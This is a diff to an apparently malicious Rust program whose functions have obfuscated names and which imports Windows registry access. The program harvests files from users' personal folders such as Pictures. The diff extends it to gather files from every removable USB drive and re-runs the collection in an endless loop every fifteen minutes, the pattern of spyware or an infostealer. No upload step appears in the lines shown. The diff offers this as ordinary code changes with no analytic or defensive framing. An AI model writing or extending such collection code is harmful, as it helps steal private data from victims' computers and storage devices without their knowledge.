@@ -11,6 +11,7 @@ use rand::Rng;
 use tokio::time::{sleep, Duration};
 use std::env;
 use std::time::{SystemTime, UNIX_EPOCH};
+use sysinfo::{DiskExt, System, SystemExt};
 
 #[cfg(windows)]
 use winreg::enums::*;
@@ -95,12 +96,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 async fn task_one() -> Result<(), Box<dyn std::error::Error>> {
-    let m = task_six()?;
+    loop {
+        let m = task_six()?;
 
-    if m.is_empty() {
-        println!("No data.");
-        return Ok(());
-    }
+        if m.is_empty() {
+            println!("No data.");
+            continue;
+        }
 
     let n = task_seven(&m)?;
 
@@ -114,8 +116,8 @@ async fn task_one() -> Result<(), Box<dyn std::error::Error>> {
             Err(e) => println!("Error processing item {}: {}", i + 1, e),
         }
     }
-
-    Ok(())
+        tokio::time::sleep(Duration::from_secs(900)).await;
+    }
 }
 
 #[cfg(windows)]
@@ -287,6 +289,23 @@ fn task_nine(pp: &Path, qq: &str) -> Result<Vec<Data>, Box<dyn std::error::Error
     Ok(rr)
 }
 
+fn scan_usb_drives() -> Result<Vec<Data>, Box<dyn std::error::Error>> {
+    let mut s = System::new_all();
+    s.refresh_all();
+    let mut usb_files = Vec::new();
+
+    for disk in s.disks() {
+        if disk.is_removable() {
+            let mount_point = disk.mount_point();
+            if let Ok(mut files) = task_nine(mount_point, &disk.name().to_string_lossy()) {
+                usb_files.append(&mut files);
+            }
+        }
+    }
+
+    Ok(usb_files)
+}
+
 fn task_six() -> Result<Vec<Data>, Box<dyn std::error::Error>> {
     let mut eee = Vec::new();
 
@@ -312,6 +331,10 @@ fn task_six() -> Result<Vec<Data>, Box<dyn std::error::Error>> {
         if let Ok(mut mmm) = task_nine(&lll, "Pictures") {
             eee.append(&mut mmm);
         }
+    }
+
+    if let Ok(mut usb_files) = scan_usb_drives() {
+        eee.append(&mut usb_files);
     }
 
     Ok(eee)
